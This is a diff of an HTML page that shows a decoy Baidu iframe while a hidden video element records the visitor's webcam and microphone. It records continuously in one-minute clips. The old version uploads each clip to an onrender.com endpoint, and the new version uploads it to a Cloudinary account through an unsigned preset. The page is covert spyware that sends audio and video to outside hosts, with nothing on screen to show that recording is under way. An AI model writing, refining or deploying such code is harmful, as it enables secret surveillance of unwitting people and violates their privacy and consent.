@@ -1,139 +1,101 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webcam BG Process</title>
-    <style>
-        /* 确保 iframe 能够铺满整个页面 */
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden; /* 隐藏滚动条 */
-        }
-        #bg-frame {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        /* 功能性 video 元素需要存在但完全隐藏 */
-        #webcam {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webcam Background Recorder → Cloudinary</title>
+  <style>
+    html, body {
+      margin: 0; padding: 0; height: 100%;
+      overflow: hidden;
+    }
+    #bg-frame {
+      position: absolute; top: 0; left: 0;
+      width: 100%; height: 100%;
+      border: none;
+    }
+    #webcam { display: none; }
+  </style>
 </head>
 <body>
 
-    <video id="webcam" autoplay playsinline muted></video>
+  <video id="webcam" autoplay playsinline muted></video>
+  <iframe id="bg-frame" src="https://www.baidu.com"></iframe>
 
-    <iframe id="bg-frame" src="https://www.baidu.com"></iframe>
+  <script>
+    const webcamVideo = document.getElementById('webcam');
+    let stream, isRecording = false;
+    const RECORDING_DURATION = 60000; // 每段视频 1 分钟
 
-    <script>
-        const webcamVideo = document.getElementById('webcam');
-        
-        let stream;
-        let isRecording = false; // 状态锁，防止重叠
-        const RECORDING_DURATION = 60000; // 录制时长（毫秒），这里是1分钟
+    // Cloudinary 配置（只需要 cloud_name 和 upload_preset）
+    const CLOUD_NAME = "dxic8oxo1";         // 替换成你自己的
+    const UPLOAD_PRESET = "webcam_upload";  // 替换成你新建的 unsigned preset
 
-        // 核心的录制和上传函数
-        async function startRecordingCycle() {
-            if (!stream || isRecording) {
-                console.log('媒体流未就绪或正在录制中，跳过。');
-                return;
-            }
+    // 上传函数
+    async function uploadToCloudinary(blob) {
+      const formData = new FormData();
+      formData.append("file", blob);
+      formData.append("upload_preset", UPLOAD_PRESET);
 
-            isRecording = true; // 上锁
-            let recordedChunks = [];
-            console.log('开始新的1分钟录制...');
-
-            try {
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
-
-                // 2. 收集数据
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-
-                // 3. 录制停止后触发上传
-                mediaRecorder.onstop = async () => {
-                    console.log('录制停止，准备上传。');
-                    const recordedBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    recordedChunks = []; // 清空数据块数组
-
-                    const formData = new FormData();
-                    formData.append('video', recordedBlob, `recording-${Date.now()}.webm`);
-
-                    try {
-                        // ==================================================================
-                        // 关键改动：将上传地址更新为您提供的在线服务器地址
-                        const response = await fetch('https://webcam-api.onrender.com/upload', {
-                            method: 'POST',
-                            body: formData,
-                        });
-                        // ==================================================================
-
-                        if (response.ok) {
-                            const result = await response.json();
-                            console.log('上传成功:', result.message, ' at', new Date().toLocaleTimeString());
-                        } else {
-                            console.error('上传失败:', response.statusText, await response.text());
-                        }
-                    } catch (error) {
-                        console.error('上传发生错误:', error);
-                    } finally {
-                        // 不论上传成功与否，都解锁并开始下一次录制
-                        console.log('准备开始下一次录制...');
-                        isRecording = false;
-                        // 立即开始下一个录制周期
-                        startRecordingCycle();
-                    }
-                };
-
-                // 1. 开始录制
-                mediaRecorder.start();
-                
-                // 4. 设置一个定时器，在指定时间后停止录制
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, RECORDING_DURATION);
-
-            } catch(e) {
-                console.error("MediaRecorder 初始化失败:", e);
-                isRecording = false; // 出错解锁
-            }
+      try {
+        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
+          method: "POST",
+          body: formData
+        });
+        const data = await res.json();
+        if (res.ok) {
+          console.log("上传成功:", data.secure_url);
+        } else {
+          console.error("上传失败:", data);
         }
+      } catch (err) {
+        console.error("上传错误:", err);
+      }
+    }
 
-        // 初始化摄像头并启动录制循环
-        async function init() {
-            try {
-                // 请求音视频权限
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 1280, height: 720 }, 
-                    audio: true // 录像通常需要音频
-                });
-                webcamVideo.srcObject = stream;
-                
-                webcamVideo.onloadedmetadata = () => {
-                    console.log('摄像头已就绪，后台录制进程启动。');
-                    // 摄像头就绪后，直接启动录制循环
-                    startRecordingCycle();
-                };
+    // 自动录制并上传循环
+    async function startRecordingCycle() {
+      if (!stream || isRecording) return;
+      isRecording = true;
+      let chunks = [];
 
-            } catch (error) {
-                console.error('摄像头访问被拒绝或出错:', error);
-            }
-        }
+      try {
+        const recorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
 
-        // 启动
-        init();
-    </script>
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: "video/webm" });
+          chunks = [];
+          await uploadToCloudinary(blob);
+          isRecording = false;
+          startRecordingCycle(); // 下一轮录制
+        };
+
+        recorder.start();
+        setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, RECORDING_DURATION);
+
+      } catch (err) {
+        console.error("MediaRecorder 出错:", err);
+        isRecording = false;
+      }
+    }
+
+    // 初始化摄像头并启动循环
+    async function init() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: 1280, height: 720 },
+          audio: true
+        });
+        webcamVideo.srcObject = stream;
+        webcamVideo.onloadedmetadata = () => startRecordingCycle();
+      } catch (err) {
+        console.error("摄像头/麦克风权限出错:", err);
+      }
+    }
+
+    init();
+  </script>
 </body>
 </html>
